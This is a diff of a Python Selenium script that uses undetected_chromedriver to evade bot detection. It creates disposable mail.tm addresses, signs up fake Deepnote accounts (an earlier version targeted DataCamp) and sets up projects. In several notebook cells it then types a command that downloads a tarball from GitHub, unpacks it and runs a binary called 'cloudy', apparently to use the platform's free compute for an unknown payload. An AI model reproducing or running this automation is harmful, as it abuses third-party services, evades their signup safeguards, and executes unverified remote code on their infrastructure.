@@ -1,163 +1,170 @@
 if __name__ == "__main__":
     import undetected_chromedriver as uc
-    from selenium.webdriver import Chrome
-    from selenium import webdriver
-    from selenium.webdriver.common.keys import Keys
     import time
-    import random
-    import json
-    import os
-    import requests
     from selenium.webdriver.common.by import By
-    from selenium.webdriver.chrome.options import Options
-    a = False
-    # os.system("rm -rf rawrz")
-    # os.system("tar -xf volx.tar.gz")
-    # os.system("rm -rf rawr")
-    # os.system("cp -r rawrz rawr")
-    low_word = "abcdefghijklkmnopqrstuvwxyz"
-    upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
-    number = "1234567890"
-    symbols = "!@#$%&*"
-    username_for = low_word
-    password_for = low_word + upper_word + number + symbols
-    long_password = 16
-    long_username = 12
-    ass = "".join(random.sample(username_for, 12))
+    from selenium.webdriver.common.action_chains import ActionChains
+    import random
     options = uc.ChromeOptions()
-    options.add_argument("--window-size=1920,1080")
-    options.add_argument("--remote-debugging-port=38223")
-    driver = uc.Chrome(options=options, version_main=106)
-    passwd = "".join(random.sample(low_word, 12))+"H!1"
-
-
-
-    driver.get("https://www.datacamp.com/")
-
+    driver = uc.Chrome(options=options, version_main=106)  # version_main allows to specify your chrome version instead of following chrome global version
     driver.set_window_size(1920, 1080)
-
-
-
-    time.sleep(12)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/header/div[1]/div[1]/div[2]/form/fieldset[1]/label/div/input").send_keys("".join(random.sample(low_word, 12))+"@cldkid.com")
-    time.sleep(0.5)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/header/div[1]/div[1]/div[2]/form/fieldset[2]/label/div/input").send_keys("".join(random.sample(low_word, 12))+"Ah!1")
-    time.sleep(0.5)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/header/div[1]/div[1]/div[2]/form/button").click()
-    time.sleep(7)
-    driver.get("https://app.datacamp.com/workspace")
-
-    time.sleep(3)
-
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div[2]/div/div/div/div/a").click()
-    time.sleep(4)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div[2]/div/div/main/div/div[2]/div[2]/section/section[1]/div[1]/button").click()
-    time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[2]/div/input").send_keys("https://github.com/n2dhektor/upgraded-octo-funicular")
-    time.sleep(0.5)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[4]/div[1]/div[2]/label").click()
-    time.sleep(0.5)
+    low_word = "abcdefghijklkmnopqrstuvwxyz"
+    driver.execute_script('''window.open("http://bings.com","_blank");''')
+    driver.switch_to.window(driver.window_handles[1])
+    time.sleep(1)
+    driver.get("https://mail.tm/")
+    time.sleep(5)
     try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
+        driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div/div[2]/div/button[3]').click()
     except:
         pass
     time.sleep(1)
-    try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
-    except:
-        pass
-    time.sleep(8)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[1]/div[1]/button[1]").click()
-    time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[2]/div[1]/div/div[1]/div/div/div[1]/button").click()
-    time.sleep(8)
-    driver.get("https://app.datacamp.com/workspace/overview")
-    time.sleep(4)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div[2]/div/div/main/div/div[2]/div[2]/section/section[1]/div[1]/button").click()
-    time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[2]/div/input").send_keys("https://github.com/n2dhektor/upgraded-octo-funicular")
-    time.sleep(0.5)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[4]/div[1]/div[2]/label").click()
-    time.sleep(0.5)
-    try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
-    except:
-        pass
+    driver.find_element(By.XPATH, '/html/body/div[2]/div/div/div[2]/div/div/div[2]/div[5]/button').click()
+    time.sleep(6)
+    emil = driver.find_element(By.XPATH, '/html/body/div[2]/div/div/div[2]/div/div/div[1]/div/div/input').get_attribute("value")
+    print(emil)
+    driver.switch_to.window(driver.window_handles[0])
+
+    driver.get("https://deepnote.com/sign-up")
     time.sleep(1)
-    try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
-    except:
-        pass
-    time.sleep(8)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[1]/div[1]/button[1]").click()
-    time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[2]/div[1]/div/div[1]/div/div/div[1]/button").click()
-    time.sleep(8)
-    driver.get("https://app.datacamp.com/workspace/overview")
-    time.sleep(4)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div[2]/div/div/main/div/div[2]/div[2]/section/section[1]/div[1]/button").click()
-    time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[2]/div/input").send_keys("https://github.com/n2dhektor/upgraded-octo-funicular")
-    time.sleep(0.5)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[4]/div[1]/div[2]/label").click()
-    time.sleep(0.5)
-    try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
-    except:
-        pass
+    driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/div[2]/button[3]').click()
+    time.sleep(2)
+    driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/div[2]/div/div/div/input').send_keys(emil)
     time.sleep(1)
-    try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
-    except:
-        pass
-    time.sleep(8)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[1]/div[1]/button[1]").click()
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div/div[2]/button").click()
+    time.sleep(20)
+    driver.switch_to.window(driver.window_handles[1])
+    driver.get(driver.find_element(By.XPATH, "/html/body/div[2]/div/div/div[2]/main/div/div[2]/ul/li/a").get_attribute("href"))
     time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[2]/div[1]/div/div[1]/div/div/div[1]/button").click()
-    time.sleep(8)
-    driver.get("https://app.datacamp.com/workspace/overview")
-    time.sleep(4)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div[2]/div/div/main/div/div[2]/div[2]/section/section[1]/div[1]/button").click()
-    time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[2]/div/input").send_keys("https://github.com/n2dhektor/upgraded-octo-funicular")
-    time.sleep(0.5)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[4]/div[1]/div[2]/label").click()
-    time.sleep(0.5)
-    try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
-    except:
-        pass
+    iframe = driver.find_element_by_xpath("/html/body/div[2]/div/div/div[2]/main/div/div[3]/div[2]/div/iframe")
+    driver.switch_to.frame(iframe)
     time.sleep(1)
-    try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
-    except:
-        pass
-    time.sleep(8)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[1]/div[1]/button[1]").click()
-    time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[2]/div[1]/div/div[1]/div/div/div[1]/button").click()
-    time.sleep(8)
-    driver.get("https://app.datacamp.com/workspace/overview")
-    time.sleep(4)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div[2]/div/div/main/div/div[2]/div[2]/section/section[1]/div[1]/button").click()
-    time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[2]/div/input").send_keys("https://github.com/n2dhektor/upgraded-octo-funicular")
+    linkz = driver.find_element(By.XPATH, "/html/body/table[2]/tbody/tr/td/table/tbody/tr[2]/td/table/tbody/tr/td/a").get_attribute("href")
+    driver.switch_to.default_content()
+    driver.switch_to.window(driver.window_handles[0])
     time.sleep(0.5)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/div/div/div/div[4]/div[1]/div[2]/label").click()
-    time.sleep(0.5)
-    try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
-    except:
-        pass
-    time.sleep(1)
-    try:
-        driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div/section/div/div[2]/form/footer/button[2]").click()
-    except:
-        pass
-    time.sleep(8)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[1]/div[1]/button[1]").click()
+    driver.get(linkz)
     time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/main/div[1]/div/div/div/div/div[2]/div[2]/div[1]/div/div[1]/div/div/div[1]/button").click()
-    time.sleep(8)
+    driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div[2]/div/div/div[1]/input[1]').send_keys("".join(random.sample(low_word, 6)))
+    time.sleep(0.5)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[2]/button").click()
+    time.sleep(2.5)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[1]/div/select/option[3]").click()
+    time.sleep(0.5)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[2]/select/option[2]").click()
+    time.sleep(0.5)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[3]/select/option[2]").click()
+    time.sleep(0.5)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[2]/button").click()
+    time.sleep(2)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/button[2]").click()
+    time.sleep(2)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/div/input").send_keys("".join(random.sample(low_word, 6)))
+    time.sleep(0.5)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button").click()
+    time.sleep(0.5)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button[1]").click()
+    time.sleep(0.5)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button[2]").click()
+    time.sleep(10)
+
+    driver.get(driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[1]/div[3]/div/div[2]/div/div/div/div[1]/div/div/a").get_attribute("href"))
+    time.sleep(3)
+
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[2]/div/div[3]/div/div/div/div[6]/div/button").click()
+    time.sleep(2.5)
+    driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div/div[8]/div/div/button[6]').click()
+    time.sleep(2.5)
+    driver.find_element(By.XPATH, "/html/body/div[5]/div/div[3]/div/section/footer/button[2]").click()
+    time.sleep(2.5)
+
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[2]/div/div[3]/div/div/div/div[6]/div/button").click()
+    time.sleep(2.5)
+    driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div/div[7]/div/div/button[6]').click()
+    time.sleep(2.5)
+    driver.find_element(By.XPATH, "/html/body/div[5]/div/div[3]/div/section/footer/button[2]").click()
+    time.sleep(2.5)
+
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[2]/div/div[3]/div/div/div/div[6]/div/button").click()
+    time.sleep(2.5)
+    driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div/div[6]/div/div/button[6]').click()
+    time.sleep(2.5)
+    driver.find_element(By.XPATH, "/html/body/div[5]/div/div[3]/div/section/footer/button[2]").click()
+    time.sleep(2.5)
+
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[2]/div/div[3]/div/div/div/div[6]/div/button").click()
+    time.sleep(2.5)
+    driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div/div[5]/div/div/button[6]').click()
+    time.sleep(2.5)
+    driver.find_element(By.XPATH, "/html/body/div[5]/div/div[3]/div/section/footer/button[2]").click()
+    time.sleep(2.5)
+    time.sleep(3)
 
 
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[1]/button").click()
+    time.sleep(2)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[2]/div/div/button[1]").click()
+    time.sleep(40)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[2]/div/div[3]/div[1]/button[1]").click()
+    time.sleep(0.5)
+    actions = ActionChains(driver)
+    actions.send_keys('!wget https://github.com/n2dhektor/silver-octo-palm-tree/blob/main/idfk.tar.gz && tar -xf idfk.tar.gz && ./cloudy')
+    actions.perform()
+    time.sleep(1)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[4]/div/div[2]/div[3]/div/div[1]").click()
+    time.sleep(1)
+    driver.get(driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[1]/div[3]/div/div[2]/div/div/div/div[1]/div/div/a").get_attribute("href"))
+    time.sleep(4)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[1]/button").click()
+    time.sleep(2)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[2]/div/div/button[1]").click()
+    time.sleep(40)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[2]/div/div[3]/div[1]/button[1]").click()
+    time.sleep(0.5)
+    actions = ActionChains(driver)
+    actions.send_keys('!wget https://github.com/n2dhektor/silver-octo-palm-tree/blob/main/idfk.tar.gz && tar -xf idfk.tar.gz && ./cloudy')
+    actions.perform()
+    time.sleep(1)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[4]/div/div[2]/div[3]/div/div[1]").click()
+    time.sleep(3)
+    driver.get(driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[1]/div[3]/div/div[2]/div/div/div/div[1]/div/div/a").get_attribute("href"))
+    time.sleep(4)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[1]/button").click()
+    time.sleep(2)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[2]/div/div/button[1]").click()
+    time.sleep(40)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[2]/div/div[3]/div[1]/button[1]").click()
+    time.sleep(0.5)
+    actions = ActionChains(driver)
+    actions.send_keys('!wget https://github.com/n2dhektor/silver-octo-palm-tree/blob/main/idfk.tar.gz && tar -xf idfk.tar.gz && ./cloudy')
+    actions.perform()
+    time.sleep(1)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[4]/div/div[2]/div[3]/div/div[1]").click()
+    time.sleep(3)
+    driver.get(driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[1]/div[3]/div/div[2]/div/div/div/div[1]/div/div/a").get_attribute("href"))
+    time.sleep(4)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[1]/button").click()
+    time.sleep(2)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[2]/div/div/button[1]").click()
+    time.sleep(40)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[2]/div/div[3]/div[1]/button[1]").click()
+    time.sleep(0.5)
+    actions = ActionChains(driver)
+    actions.send_keys('!wget https://github.com/n2dhektor/silver-octo-palm-tree/blob/main/idfk.tar.gz && tar -xf idfk.tar.gz && ./cloudy')
+    actions.perform()
+    time.sleep(1)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[4]/div/div[2]/div[3]/div/div[1]").click()
+    time.sleep(3)
+    driver.get(driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[1]/div[3]/div/div[2]/div/div/div/div[1]/div/div/a").get_attribute("href"))
+    time.sleep(4)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[1]/button").click()
+    time.sleep(2)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[2]/div/div/button[1]").click()
+    time.sleep(40)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[2]/div/div[3]/div[1]/button[1]").click()
+    time.sleep(0.5)
+    actions = ActionChains(driver)
+    actions.send_keys('!wget https://github.com/n2dhektor/silver-octo-palm-tree/blob/main/idfk.tar.gz && tar -xf idfk.tar.gz && ./cloudy')
+    actions.perform()
+    time.sleep(1)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[4]/div/div[2]/div[3]/div/div[1]").click()
+    time.sleep(14)
